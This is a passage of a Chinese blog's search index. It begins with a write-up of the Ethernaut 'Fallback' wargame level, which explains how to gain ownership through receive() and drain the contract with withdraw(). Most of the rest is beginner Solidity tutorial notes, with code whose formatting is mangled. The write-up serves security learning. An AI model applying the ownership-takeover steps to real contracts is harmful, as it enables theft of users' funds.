contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; payable(owner).transfer(address(this).balance); &#125; receive() external payable &#123; require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; 2. 分析 2.1 该题的题眼在于，通过owner &#x3D; msg.sender语句把合约的所有权设置为合约调用者，观察分析合约可知，在contribute()方法和 receive() 方法中拥有该语句，但如果执行contribute() 的话需要调用 0.001 * 1000000 + 1次 显然这样的作法是不可取的，故 只能采用receive()方法来实现 2.2 receive()成功调用的条件是，调用者的贡献值大于0.001ether 还用支付 &gt; 0的费用，我们只能通过调用contribute()函数改变合约调用者的贡献值，改好之后就可以调用到合约的receive()函数，就可以成为合约的拥有者 2.3 最后调用withdraw() 函数将合约的钱全部转给owner 即： 3.解题 3.1 先从题目中获取关卡的地址： 3.2 到remix中，将网络和账户切换为自己的钱包账户， 3.3 给自己的钱包账户加入贡献值 contributions 3.4 调用receive() 函数，实现获取 合约所有权操作 3.5 查看当前合约的owner 3.6 最后调用withdraw() 函数，将合约的余额全部转出 3.7 回到题目提交实例 3.8 返回结果，通过！！！：","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"solidity相关知识","slug":"Solidity/Basic_Knowledge/solidity相关知识","date":"2023-01-01T08:47:10.000Z","updated":"2023-01-01T08:47:10.000Z","comments":true,"path":"2023/01/01/Solidity/Basic_Knowledge/solidity相关知识/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/01/Solidity/Basic_Knowledge/solidity%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/","excerpt":"","text":"官方文档Solidity_day01tips: 一些重要的属性 入门须知：12345// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract HelloWeb3&#123; string public _string = &quot;Hello Web3!&quot;;&#125; 代码解读： 第一行是注释，会写一下这个代码所用的软件许可（license），这里用的是MIT license。 如果不写许可，编译时会警告，但程序可以运行。solidity 的注释是由”&#x2F;&#x2F;“ 开头，后面跟注释的内容（不会被程序运行）。 1// SPDX-License-Identifier: MIT 第二行声明源文件所用的 solidity 版本，因为不同的版本语法有差别。这行代码将不允许小于 0.8.4 版本 或者 大于0.9.0版本的编译器编译（第二个条件由 ^ 提供）。Solidity 语句以分号（;）结尾。 1pragma solidity ^0.8.4; 第3-4行是合约部分，第3行创建合约（contract），并声明合约的名字 HelloWeb3。第4行是合约的内容，我们声明了一个string（字符串）变量_string，并给他赋值 “Hello Web3!”。 123contract HelloWeb3&#123; string public _string = &quot;Hello Web3!&quot;;&#125; 1. 数值类型solidity 中的变量类型 数值类型：布尔型，整数型，这类变量赋值的时候直接传递参数 引用类型： 包括数组和结构体，这类变量占用空间大，赋值的时候直接传递地址（类似于指针） 映射类型：solidity里的哈希表 函数类型：solidity文档里把函数归到数值类型，它和其他类型差别很大 1.1 布尔类型布尔类型是二值变量，取值为true 或 false 12// 布尔值bool public flag = true; 代码： 1234567891011// 布尔运算 //取非 bool public flag1 = !flag; // false //与 bool public flag2 = _bool &amp;&amp; flag1; // false //或 bool public flag3 = _bool || flag1; // true //相等 bool public flag4 = flag == flag1; // false //不相等 bool public flag5 = flag != flag1; // true tips: 值得注意的是：&amp;&amp; 和 || 运算符和Java中的 &amp;&amp; 和 || 一样的用法和使用规则,都是遵循短路规则，这意味着，假如存在f(x) || g(y) 的表达式，如果 f(x) 是true，g(y) 不会被计算，即使它和 f(x) 的结果是相反的，同理 &amp;&amp; 也是，f(x) &amp;&amp; g(y) 表达式若f(x) 为false ,则不会执行g(y)。 1.2. 整型整型是solidity 中的整数，最常用的包括 1234// 整型 int public _int = -1; // 整数，包括负数 uint public _uint = 1; // 正整数 uint256 public _number = 20220330; // 256位正整数 常用的整数运算符包括： 比较运算符（返回布尔值）: &gt;, &lt;, &#x3D;&#x3D;, &gt;&#x3D;, &lt;&#x3D;, !&#x3D; 算数运算符：+, -, *, &#x2F;, %, **(幂) 代码： 12345// 整数运算uint256 public _number1 = _number + 1; // +，-，*，/uint256 public _number2 = 2**2; // 指数uint256 public _number3 = 7 % 2; // 取余数bool public _numberbool = _number2 &gt; _number3; // 比大小 1.3. 地址类型地址类型(address) 存储一个 20 字节的值（以太坊地址的大小）。地址类型也有成员变量，并作为所有合约的基础。有普通的地址和可以转账ETH的地址 (payable)。payable的地址拥有balance和 transfer() 两个成员，方便查询ETH余额以及转账。 12345// 地址address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;address payable public _address1 = payable(_address);//payable address，可以转账、查余额// 地址类型的成员uint256 public balance = _address1.balance; // balance of address 1.4. 定长字节数组字节数组bytes 分两种，一种定长（byte, bytes8, bytes32), 另一种不定长。定长的属于数值类型，不定长的是引用类型。定长bytes 可以存一些数据，消耗gas比较少。 123// 固定长度的字节数组bytes32 public _byte32 = &quot;MiniSolidity&quot;; bytes1 public _byte = _byte32[0]; MiniSolidity 变量以字节的方式存储进变量_byte32, 转化为16进制为： 0x4d696e69536f6c69646974790000000000000000000000000000000000000000 _bytes 变量存储 _bytes32 的第一个字节，为0x4d。 1.5 枚举 enum枚举(enum) 是solidity 中用户定义的数据烈性。它主要用于 uint 分配名称，使程序易于阅读和维护。它与c 语言中的enum 类似，使用名称来代替从 0 开始的uint： 1234// 用enum将uint 0， 1， 2表示为Buy, Hold, Sellenum ActionSet &#123; Buy, Hold, Sell &#125;// 创建enum变量 actionActionSet action = ActionSet.Buy; 它可以显式的和uint相互转换，并会检查转换的正整数是否在枚举的长度内，不然会报错： 1234// enum可以和uint显式的转换function enumToUint() external view returns(uint)&#123; return uint(action);&#125; 2. 函数类型2.1 solidity中的函数 详情可参考 官方文档1function &lt;function name&gt; (&lt;parameter types&gt;) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types&gt;)] tips: 方括号中的是可写可不写的关键字 funtion: s声明函数时的固定用法，想写函数，就要以function 关键字开头 ： 函数名 (): 圆括号里写函数的参数，也就是要输入到函数的变量类型和名字。 {internal|external|public|private}：函数可见性说明符，一共4种。没标明函数类型的，默认internal。 public ： 内部外部都可见。（也可用于修饰状态变量，public变量会自动生成getter函数，用于查询数值）。 private： 只能从本合约内部访问，继承的合约也不能用（也可用于修饰状态变量）。 external: 只能从合约外部访问（但是可以用this.f()来调用，f 是函数名。 - 可以直接调用内部函数，即 internal修饰的函数: - - 不能直接调用外部函数，即external修饰的函数，要用 this. 来调用： - - 否则就会报错： - - internal: 只能从合约内部访问，继承的合约可以用（也可用于修饰状态变量）。 - internal 修饰的函数可以直接被合约内的函数调用，internal 和 external 修饰的函数都可以 - 调用internal 修饰的： - - 调用external 修饰的： - - internal 可以调用 external 修饰的函数，（以我目前的水平我还是不能发现这样做有什么用处），只能通过 this.f() 【f是方法名】调用 - 否则就会报错： - - 演示代码： 12345678910111213141516171819202122232425262728293031323334353637383940// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract inter_exer &#123; address public owner; string public value; constructor() payable &#123; // 将owner 的值设置为当前合约地址 owner = address(this); &#125;// 内部函数 function inter() internal returns(string memory) &#123; value = &quot;This is inter()&quot;; return value; &#125;// 调用内部函数 function useInter() internal &#123; // this.exter(); // 通过this. 调用external 修饰的函数 inter(); &#125;// 外部函数 function exter() external returns(string memory) &#123; // useInter(); // string memory _exter = &quot;This is exter()&quot;; value = &quot;This is exter()&quot;; return value;&#125;// 调用外部函数 function useExter() external &#123; useInter(); // this.exter(); &#125;&#125; [pure | view | payable] : 决定函数权限&#x2F; 功能的关键字。payable (可支付的) ，带着它的函数，运行的时候可以给合约转入ETH 在以太坊中，如下语句被视为上链 - 写入状态变量 - 释放事件 - 创建其他合同 - 使用selfdestruct - 通过调用发送以太币 - 调用任何未标记view 和 pure 的函数 - 使用低级调用（low-level class) - 使用包含某些操作码的内联汇编 马里奥插图，合约中的转台变量（存储在链上）比作公主，三个关键字表示不同的角色 pure：中文翻译为“纯”，在solidity中理解为“纯牛子”。包含pure关键字的函数，不能读取也不能写入存储在链上的转台变量。就像小怪一样，看不到摸不着公主。 view：中文翻译为“看”，在solidity中理解为“看客”。包含view 关键字的函数，能读取但不能写入状态变量。类似马里奥，能看到公主，但终究是看客，不能入洞房。 默认值（即不带view 和 pure）：函数既可以读取也可以写入状态变量。类似马里奥中 的boss， 可以对公主为所欲为🤪🤪🤪。 pure 和 view 的区别 在合约中定义一个状态变量 number &#x3D; 5 1234// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract FunctionTypes&#123; uint256 public number = 5; 定义一个add()函数，每次调用，每次给number + 1 1234// 默认function add() external&#123; number = number + 1;&#125; 如果add()包含了pure关键字，例如 function add() pure external，就会报错。因为pure（纯纯牛马）是不配读取合约里的状态变量的，更不配改写。那pure函数能做些什么？举个例子，你可以给函数传递一个参数 _number，然后让他返回 _number+1 1234// pure: 纯纯牛马function addPure(uint256 _number) external pure returns(uint256 new_number)&#123; new_number = _number+1;&#125; view 修饰的函数，可以查看但是不能调用 1234 // view: 看客function divView (uint256 _number) external view returns(uint256 new_number)&#123; new_number = _number-1; &#125; payable 修饰的函数是可以直接给合约支付eth的 如，我用payable 修饰我的构造函数，在编译的时候便可以给合约支付eth了 [returns()]： 函数返回的变量类型和名称。 如果在returns() 的 （） 中声明了返回值的名字，且与函数体内所需返回的变量相同，则可以不需要在函数体内写return 语句, 例如： 123function divView (uint256 _number) external view returns(uint256 new_number)&#123; new_number = _number-1; &#125; 3. 函数输出3.1 返回值return 和 returnssolidity 有两个关键字与函数输出相关：return 和 returns， 他们的区别在于： returns 加在函数名后面，用于声明返回的变量类型及变量名； return 用于函数主体中，返回指定的变量。 1234// 返回多个变量function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123; return(1, true, [uint256(1),2,5]); &#125; 这段代码中，returnMultiple() 函数中将有多个输出值：returns(uint256, bool, uint256[3] memory)， 接着我们在函数主体中用 return(1, true, [uint256(1),2,5]) 确定了返回值。 其中对 uint256[3] memory 和 [uint256(1),2,5] 的理解和查阅资料： 沃日…. 这个是数组，我竟然没看出来，数组到后面再看，慢慢来嘛🍧🍧🍧 3.2 命名式返回我们可以在returns 中标明返回变量的名称，这样solidity会自动给这些变量初始化，并且自动返回这些函数的值，不需要加return。 123456// 命名式返回function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123; _number = 2; _bool = false; _array = [uint256(3),2,1];&#125; 代码中，returns(uint256 _number, bool _bool, uint256[3] memory _array) 声明了返回变量类型以及变量名。这样，我们在主体中只需给变量 _number， _bool， _array 赋值就可以自动返回了。 也可以在命名格式返回中用 return 来返回变量： 1234// 命名式返回，依然支持returnfunction returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123; return(1, true, [uint256(1),2,5]);&#125; 3.3 解构式赋值solidity 使用结构式赋值的规则， 支持读取函数的全部或 部分返回值 读取所有函数返回值：声明变量，并且将要赋予的变量用 , 号隔开，按顺序排列 1234uint256 _number;bool _bool;uint256[3] memory _array;(_number, _bool, _array) = returnNamed(); 读取部分返回值：声明要读取的返回值对应的变量，不读取的留空。下面这段代码，我们只读取 _bool ， 而不读取返回的 _number 和 _arrary ： 1(, _bool2, ) = returnNamed(); 4. 变量数据存储和作用域tips: 引用类型 ： 包括数组（arrary），结构体（struct）和 映射（mapping），这类变量占空间大，赋值时候直接传递地址（类似指针）。由于这类变量比较复杂，占用存储空间大，我们在使用是必须要声明数据存储的位置。 4.1 数据位置solidity 数据存储位置有三大类：storage， memory， 和 calldata。不同存储位置的gas 成本不同。storage类型的数据存在链上，类似计算机的硬件，消耗gas多；memory 和 calldata 类型的临时存在内存里，消耗gas少。大致用法： storage：合约中的状态变量默认都是storage， 存储在链上 memory： 函数里的参数和临时变量一般用memory，存储在内存中，不上链 calldata： 和memory 类似，存储在内存中，不上链。与memoruy的不同点在于calldata 变量不能修改（immutable），一般用于函数的参数。 例子： 12345function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123; //参数为calldata数组，不能被修改 // _x[0] = 0 //这样修改会报错 return(_x);&#125; tips: calldata变量 不上链，不能修改。 4.2 数据位置和赋值规则在不同存储类型相互赋值的时候，有时会产生独立的副本（修改新变量不会影响原变量），优势会产生引用（修饰新变量会影响原变量）。规则如下： 4.2.1 storage：（合约的状态变量）赋值给本地storage （函数里的）时候，会创建引用，改变新变量会影响原变量。例子： 123456789uint[] x = [1,2,3]; // 状态变量：数组 x function fStorage() public&#123; //声明一个storage的变量 xStorage，指向x。修改xStorage也会影响x uint[] storage xStorage = x; xStorage[0] = 100;&#125;// 此时 x 数组中的值为 [100,2,3] tips: 类似于Java中的 引用类型数组，都指向同一份地址，只要一处发生改变，则引用该地址的变量的值都会发生改变 4.2.2 storage 赋值给memory， 会创建独立的副本，修改其中一个不会影响另一个；反之亦然。例子： 12345678910uint[] x = [1,2,3]; // 状态变量：数组 xfunction fMemory() public view&#123; //声明一个Memory的变量xMemory，复制x。修改xMemory不会影响x uint[] memory xMemory = x; xMemory[0] = 100; xMemory[1] = 200; uint[] memory xMemory2 = x; xMemory2[0] = 300;&#125; tips：类似于Java中的基本数据类型的数组的原理，会复制一份相同的值 4.2.3 memory 赋值给memory， 会创建引用，改变新变量会影响原变量 4.2.3 其他情况，变量赋值给 storage， 会创建独立的副本，修改其中一个不会影响另一个 4.3 变量的作用域solidity中变量按作用域划分为三种，分别是状态变量（state variable），局部变量（local variable） 和全局变量（global variable） 4.3.1 状态变量 是数据存储在链上的变量，所有合约内函数都可以访问，gas 消耗高.状态变量在合约内、函数外声明： 1234contract Variables &#123; uint public x = 1; uint public y; string public z; 在函数里更改状态变量的值： 123456function foo() external&#123; // 可以在函数里更改状态变量的值 x = 5; y = 2; z = &quot;0xAA&quot;;&#125; 4.3.2 局部变量 是仅在函数执行过程中有效的变量，函数退出后，变量无效。局部变量的数据存储在内存里，不上链，gas低。局部变量在函数内声明： 123456function bar() external pure returns(uint)&#123; uint xx = 1; uint yy = 3; uint zz = xx + yy; return(zz);&#125; 4.3.3 全局变量 是全局范围工作的变量，都是solidity 预留关键字。他们可以在函数内不声明直接使用： 123456function global() external view returns(address, uint, bytes memory)&#123; address sender = msg.sender; uint blockNum = block.number; bytes memory data = msg.data; return(sender, blockNum, data);&#125; global() 函数中，msg.sender, block.number和msg.data，他们分别代表请求发起地址，当前区块高度，和请求数据。 blockhash(uint blockNumber): (bytes32)给定区块的哈希值 – 只适用于256最近区块, 不包含当前区块。 block.coinbase: (address payable) 当前区块矿工的地址 block.gaslimit: (uint) 当前区块的gaslimit block.number: (uint) 当前区块的number block.timestamp: (uint) 当前区块的时间戳，为unix纪元以来的秒 gasleft(): (uint256) 剩余 gas msg.data: (bytes calldata) 完整call data msg.sender: (address payable) 消息发送者 (当前 caller) msg.sig: (bytes4) calldata的前四个字节 (function identifier) msg.value: (uint) 当前交易发送的wei值 5. 引用类型，arrary, struct5.1 数组 arrary数组（Arrary）是solidity 常用的一种 变量类型，用来存储一组数据（整数， 字节， 地址等等）。数组分为固定长度数组和可变长数组两种： 固定长度数组：在声明时指定数组的长度。用 T[k] 的格式声明，其中T 是元素的类型， k 是长度，例如： 1234// 固定长度 Arrayuint[8] array1;bytes1[5] array2;address[100] array3; 可变长度数组（动态数组）：在声明时不指定数组长度。用 T[]的格式声明，其中 T 时元素的类型，例如（bytes 比较特殊，时数组，但是不用jia []）： 12345// 可变长度 Arrayuint[] array4;bytes1[] array5;address[] array6;bytes array7; 5.2 创建数组的规则在solidity 里，创建数组有一些规则： 对于 memory 修饰的 动态数组，可以用new 操作符来创建，但是必须要声明长度，并且声明后长度不能改变。例子： 123// memory动态数组uint[] memory array8 = new uint[](5);bytes memory array9 = new bytes(9); 数组字面常数（Array Literals）是写作表达方式形式的数组，用方括号包着初始化array 的一种方式，并且里面每一个元素的type 是以第一个元素为准的，例如[1,2,3] 里面所有的元素都是uint8 类型， 因为在solidity 中如果一个值没有指定type 的话，默认就是最小单位的该type， 这里int 的默认最小单位类型就是uint8。而[uint(10,2,3)] 里面的元素都是uint 类型，因为第一个元素指定了是uint 类型了，我们都以第一个元素为准。下面的合约中，对于f 函数里面的调用，如果我们没有显式对对第一个元素进行uint 强转的话，是会报错的，因为如上述我们其实是传入了uint8 类型的array，可是g 函数需要的却是uint 类型的array那就会报错。 12345678910// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;=0.4.16 &lt;0.9.0;contract C &#123; function f() public pure &#123; g([uint(1), 2, 3]); &#125; function g(uint[3] memory) public pure &#123; // ... &#125;&#125; 如果是创建的是动态数组，你需要一个一个的赋值 1234uint[] memory x = new uint[](3);x[0] = 1;x[1] = 3;x[2] = 4; 5.3 数组成员 tips：有点类似Java 栈 的数据结构 length：数组有一个包含元素数量的length成员，memory数组的长度是创建后固定的。 push() ：动态数组和bytes 拥有push() 成员，可以在数组最后添加一个0元素。 push(x)：动态数组和bytes拥有push(x) 成员，可以在数组最后添加一个x元素。 pop()：动态数组和bytes拥有pop()成员，可以移除数组最后一个元素。 5.4 结构体 struct solidity 支持通过构造结构体的形式定义新的类型。创建结构体的方法： 12345// 结构体struct Student&#123; uint256 id; uint256 score; &#125; 给结构体赋值的两种方法： 1234567891011121314// 给结构体赋值// 方法1:在函数中创建一个storage的struct引用function initStudent1() external&#123; Student storage _student = student; // assign a copy of student _student.id = 11; _student.score = 100;&#125; // 方法2:直接引用状态变量的structfunction initStudent2() external&#123; student.id = 1; student.score = 80;&#125; Solidity_day026. 映射类型 mapping6.1 映射Mapping 在映射中，人们可以通过键（Key）来查询对应的值（Value），比如：通过一个人的id来查询他的钱包地址。 声明映射的格式为mapping(_KeyType &#x3D;&gt; _ValueType)，其中 _KeyType 和 _ValueType 分别是Key 和 Value 的变量类型。 例： 12mapping(uint =&gt; address) public idToAddress; // id映射到地址mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址 6.2 映射的规则 规则1 ：映射的_KeyType 只能选择 solidity 默认的类型，比如uint ， address 等，不能用自定义的结构体。而__KeyType 可以使用自定义的类型。如下例子将报错（使用了自定义结构体）： 123456// 我们定义一个结构体 Structstruct Student&#123; uint256 id; uint256 score; &#125; mapping(Student =&gt; uint) public testVar; 规则2：映射的存储位置必须是 storage，因此可以用于合约的状态变量，函数中的 storage 变量，和library 函数的参数。不能用public 函数的参数或返回结果中，因为mapping 记录的是一种关系(key - value pair)。 规则3：如果映射声明为public ，那么solidity 会自动给你创建一个getter 函数，可以通过 Key 来查询对应的Value。 规则4：给映射新增的键值对的语法为 _Var[_Key] &#x3D; _Value，其中 _Var 是映射变量名， _Key 和 _Value 对应新增 的键值对。例： 123function writeMap (uint _Key, address _Value) public&#123; idToAddress[_Key] = _Value;&#125; 6.3 映射的原理 原理1：映射不存储任何键（Key）的资讯，也没有length的资讯。（不是很理解这个资讯是什么意思） 原理2：映射使用keccake256(key) 当成offset 获取 value 原理3：因为Ethereum 会定义所有未使用的空间为0; 所有为赋值（Value）的键（Key）初始值都是0 7. 变量初始值7.1 值类型初始值 boolean：false string：”” int: 0 uint: 0 enum：枚举中的第一个元素 address: 0x0000000000000000000000000000000000000000 或 address(0) function: internal: 空白方程 external：空白方程 可以用public 变量的 getter 函数验证上面写的初始值是否正确： 1234567891011bool public _bool; // falsestring public _string; // &quot;&quot;int public _int; // 0uint public _uint; // 0address public _address; // 0x0000000000000000000000000000000000000000enum ActionSet &#123; Buy, Hold, Sell&#125;ActionSet public _enum; // 第一个元素 0function fi() internal&#123;&#125; // internal空白方程 function fe() external&#123;&#125; // external空白方程 7.2引用类型初始值 映射mapping：所有元素都为其默认值的mapping 结构体struct：所有成员设为其默认值的结构体 数组arrary 动态数组：[] 静态数组（定长）: 所有成员设为其默认值的静态数组 可用public变量的getter 函数验证上面写的初始值是否正确： 12345678910// Reference Typesuint[8] public _staticArray; // 所有成员设为其默认值的静态数组[0,0,0,0,0,0,0,0]uint[] public _dynamicArray; // `[]`mapping(uint =&gt; address) public _mapping; // 所有元素都为其默认值的mapping// 所有成员设为其默认值的结构体 0, 0struct Student&#123; uint256 id; uint256 score; &#125;Student public student; 7.3 delete 操作符delete a 会让变量 a 的值变为初始值 12345// delete操作符bool public _bool2 = true; function d() external &#123; delete _bool2; // delete 会让_bool2变为默认值，false&#125; 8. 常数 constant 和 immutabletips： constant（常量）和 immutable（不变量）。状态变量声明这两个关键字之后，不能在合约后更改数值；并且还可以节省gas。另外，只有数值变量可以声明 constant 和 immutable；string 和 bytes 可以声明为constant，但不能为 immutable。 8.1 constant和 immutableconstant constant 变量 必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。 12345// constant变量必须在声明的时候初始化，之后不能改变uint256 constant CONSTANT_NUM = 10;string constant CONSTANT_STRING = &quot;0xAA&quot;;bytes constant CONSTANT_BYTES = &quot;WTF&quot;;address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000; immutable immutable 变量可以在声明时或构造函数中初始化，因此更加灵活 12345// immutable变量可以在constructor里初始化，之后不能改变uint256 public immutable IMMUTABLE_NUM = 9999999999;address public immutable IMMUTABLE_ADDRESS;uint256 public immutable IMMUTABLE_BLOCK;uint256 public immutable IMMUTABLE_TEST; 使用全局变量 address(this), block.number作为值，举例 1234567891011// 利用constructor初始化immutable变量，因此可以利用constructor()&#123; IMMUTABLE_ADDRESS = address(this); IMMUTABLE_BLOCK = block.number; IMMUTABLE_TEST = test();&#125; function test() public pure returns(uint256)&#123; uint256 what = 9; return(what);&#125; 9.控制流 solidity实现排序算法9.1 控制流solidity 的控制流与其他语言类似，主要有以下几种： 1.if - else 1234567function ifElseTest(uint256 _number) public pure returns(bool)&#123; if(_number == 0)&#123; return(true); &#125;else&#123; return(false); &#125;&#125; 2.for 循环 1234567function forLoopTest() public pure returns(uint256)&#123; uint sum = 0; for(uint i = 0; i &lt; 10; i++)&#123; sum += i; &#125; return(sum);&#125; 3.while循环 123456789function whileTest() public pure returns(uint256)&#123; uint sum = 0; uint i = 0; while(i &lt; 10)&#123; sum += i; i++; &#125; return(sum);&#125; 4.do-while循环 123456789function doWhileTest() public pure returns(uint256)&#123; uint sum = 0; uint i = 0; do&#123; sum += i; i++; &#125;while(i &lt; 10); return(sum);&#125; 5.三元运算符 12345// 三元运算符 ternary/conditional operatorfunction ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123; // return the max of x and y return x &gt;= y ? x: y; &#125; tips: continue（立即进入下一个循环）和 break （结束当前循环）和其他语言类似 9.2 简单的使用solidity实现一个冒泡排序tips： 这里如果 索引变成负数汇报错的，而且数组要加存储位置 如memory 错误如图： 12345678910111213141516171819202122232425// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract sort &#123; function bubSort(uint[] memory arr) external pure returns(uint[] memory) &#123; bool flag; uint temp; for (uint i = 0; i &lt; arr.length - 1; i++) &#123; flag = true; for (uint j = 0; j &lt; arr.length - i - 1; j++) &#123; if(arr[j] &gt; arr[j + 1]) &#123; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; flag = false; &#125; &#125; if (flag) &#123; break; &#125; &#125; return arr; &#125;&#125; 10. 构造函数和修饰器tips：有关合约控制权（Ownable） 10.1 构造函数构造函数（constructor）是一种特殊的函数，每一个合约可以定义一个，并在部署合约的时候自动运行一次。它一般用于初始化合约的一些参数，例如初始合约的owner地址： 123456address owner; // 定义owner变量// 构造函数constructor() &#123; owner = msg.sender; // 在部署合约的时候，将owner设置为部署者的地址&#125; 注意：构造函数在不同的solidity版本中的语法是比不都是一样的，在solidity0.4.22之前，构造函数不使用 constructor 而是使用与合约同名的函数作为构造函数来使用，由于这种旧写法容易使开发者书写时发生疏漏，所以在0.4.22版本之后，采用了construtor写法 构造函数的旧写法： 123456pragma solidity =0.4.21;contract Parents &#123; // 与合约名Parents同名的函数就是构造函数 function Parents () public &#123; &#125;&#125; 10. 2修饰器修饰器（modifier）和 solidity 特有的语法，类似于面向对象编程中的 decorator， 声明函数拥有的特性，并减少代码的冗余。modifier 的主要使用场景时运行函数前的检查，例如地址，变量，余额等 修饰器modifier的定义： 12345// 定义modifiermodifier onlyOwner &#123; require(msg.sender == owner); // 检查调用者是否为owner地址 _; // 如果是的话，继续运行函数主体；否则报错并revert交易&#125; 带有onlyOwner 修饰符的函数只能被 owner 地址调用，如： 123function changeOwner(address _newOwner) external onlyOwner&#123; owner = _newOwner; // 只有owner地址运行这个函数，并改变owner&#125; 解读：changeOwner() 函数，运行它是可以改变合约的owner，但是由于onlyOwner 修饰符的存在，只有原先的owner 可以调用，别人调用都会报错。这是最常用的控制智能合约权限的方法。 OppenZepplin的Ownable 标准实现：oppenzepplin 是一个维护solidity标准化代码库的组织，他的Ownable 标准实现为: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol 演示1： 用当前地址调用test 函数成功： 切换地址调用函数test ，失败 代码： 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Modifier &#123; address public owner; constructor() &#123; owner = msg.sender; &#125; modifier _onlyOwner &#123; require(msg.sender == owner, &quot;You are not owner&quot;); _; &#125; function test() external _onlyOwner &#123; &#125;&#125; 演示2（研究执行顺序）： 我先查看count的值，然后调用，testMod函数，打开交易详情，观察到count的值变成2，再次查看count的值，count &#x3D; 12， 说明 count +&#x3D;10 是在函数testMod 执行之后再执行的 示意图： 11.事件tips：ERC20代币为例（ERC20后面在学，要学会不懂装懂） 11.1 事件solidity的事件（event）是EVM上日志的抽象，它具有连个特点： 响应：应用程序（ether.js）可以通过RPC 接口订阅和监听这些事件，并在前端做响应 经济：事件是EVM 上比较经济的存储数据的方式，每个大概消耗2000gas；相比之下，链上存储一个新变量至少需要20000gas 11.2规则事件的声明由event 关键字开头，然后跟事件名称，括号里面写好事件需要记录的变量类型和变量名。以ERC20代币合约的Transfer 事件为例： 1event Transfer(address indexed from, address indexed to, uint256 value); 解读： Transfer 事件共记录了3个变量from，to 和 value，分别对应代币的转账地址，接收地址和转账数量 同时from 和 to 前面带着 indexed 关键字，每个indexed标记的变量可以理解为检索事件的索引”键”，在以太坊单独作为一个topic进行存储和索引，程序可以轻松的筛选出特定转账地址和接收地址事件。每个事件最多三个带indexed 的变量。每个indexed变量的大小为固定的256比特。事件的哈希以及这三个带有indexed的变量在EVM日志通常被存储为topic。其中topic[0] 是此事件的keccak256 哈希，topic[1] 到 topic[3] 存储了indexed 变量的 keccak256 哈希。 value 和 indexed 关键字，会存储在事件的data部分中，可以理解为事件的”值”。data 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般data部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的topic部分中，也是以哈希的方式存储。另外，data部分的变量在存储上消耗的gas相当于topic更少。 我们可以在函数里释放事件。在下面例子中，每次用_transfer() 函数进行转账操作的时候，都会释放Transfer事件，并记录相应的变量 123456789101112131415// 定义_transfer函数，执行转账逻辑function _transfer( address from, address to, uint256 amount) external &#123; _balances[from] = 10000000; // 给转账地址一些初始代币 _balances[from] -= amount; // from地址减去转账数量 _balances[to] += amount; // to地址加上转账数量 // 释放事件 emit Transfer(from, to, amount);&#125; remix上的演示 （我比较菜，我不知道看这个的有什么用，就先不实际操作一番了，以后有点知识储备了再回头来看看） 12. 继承tips：目标：简单继承，多重继承，以及修饰器（modifier）和构造函数（constructor）的继承。 12.1 规则 virtual：父合约中的函数，如果希望子合约重写，需要加上virtual关键字 override：子合约重写了父合约中的函数，需要加上override关键字 12.2 简单的继承先定义一个爷爷合约YeYe，里面包括一个Log事件，和三个function：hip(), pop(), yeye(), 输出都是“爷爷” 12345678910111213141516contract Yeye &#123; event Log(string msg); // 定义3个function: hip(), pop(), man()，Log值为Yeye。 function hip() public virtual&#123; emit Log(&quot;Yeye&quot;); &#125; function pop() public virtual&#123; emit Log(&quot;Yeye&quot;); &#125; function yeye() public virtual &#123; emit Log(&quot;Yeye&quot;); &#125;&#125; 再定义一个爸爸合约 BaBa，让他继承YeYe合约，语法就是contract BaBa is YeYe， 非常直观。在BaBa 合约里，我们重写一下hip() 和 pop() 这两个函数，加上 override关键字，并将他们的输出改为 “BaBa”; 并且加上一个新的函数，输出也是”BaBa” 1234567891011121314contract Baba is Yeye&#123; // 继承两个function: hip()和pop()，输出改为Baba。 function hip() public virtual override&#123; emit Log(&quot;Baba&quot;); &#125; function pop() public virtual override&#123; emit Log(&quot;Baba&quot;); &#125; function baba() public virtual&#123; emit Log(&quot;Baba&quot;); &#125;&#125; 我们部署合约，可以看出BaBa 合约里有 4 个函数，其中hip() 和 pop() 的输出被陈工改成 “BaBa”, 而继承来的 yeye() 的输出仍是 “YeYe” hip() ： BaBa合约中的yeye函数： 12.3 多重继承规则：继承时要按辈分的高低排。如一个Erzi 合约，继承YeYe 合约和BaBa合约，那么就要写成 contract Erzi is YeYe, BaBa, 而不能写成 contract Erzi is Baba, Yeye , 不然就会报错。如果某个函数在多个继承的合约里都存在，比如 hip() 和 pop() 函数，在子合约里必须重写，不然会报错。重写在多个父合约中都能重名的函数时，override 关键字后面要加上所有父合约名字，例如 &#96;override(YeYe,BaBa)。例： 123456789contract Erzi is Yeye, Baba&#123; // 继承两个function: hip()和pop()，输出值为Erzi。 function hip() public virtual override(Yeye, Baba)&#123; emit Log(&quot;Erzi&quot;); &#125; function pop() public virtual override(Yeye, 